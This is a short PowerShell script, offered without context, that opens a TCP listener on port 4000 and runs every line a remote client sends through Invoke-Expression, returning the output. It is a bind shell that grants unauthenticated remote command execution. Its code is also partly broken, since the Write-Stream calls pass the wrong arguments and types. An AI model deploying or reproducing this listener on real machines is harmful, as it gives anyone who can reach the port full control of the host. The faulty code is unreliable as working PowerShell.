param(
    [int]$Port = 4000
)

$Listner = [System.Net.Sockets.TcpListener]::new( $Port )
$Listner.Start()
Write-Host "Server just started..."
Write-Host "Wating for connection..."

$Client = $Listner.AcceptTcpClient()
Write-Host "Connection received..."
$Stream = $Client.GetStream()
Write-Host "Stream available..."
$StreamReader = [System.IO.StreamReader]::new($Stream)
$StreamWriter = [System.IO.StreamWriter]::new($Stream)

function Dispose-All {
    $Listner.Stop()
    $Listner.Server.Dispose()
    $StreamReader.Dispose()
    $StreamWriter.Dispose()
}

function Write-Stream ( [System.IO.StreamWriter]$stream, [string]$what ) {
    $stream.Write( $what )
    $stream.Flush()
}

while( $true ) {
    if( -not $Client.Connected ){
        Dispose-All
        break
    }
    if( $Stream.DataAvailable ){
        $command = $StreamReader.ReadLine()
        $response = ( Invoke-Expression $command )
        Write-Stream "`n"
        Write-Stream -stream $Stream -what $response
    }
    Start-Sleep -Seconds 1
}


trap{
    Dispose-All
}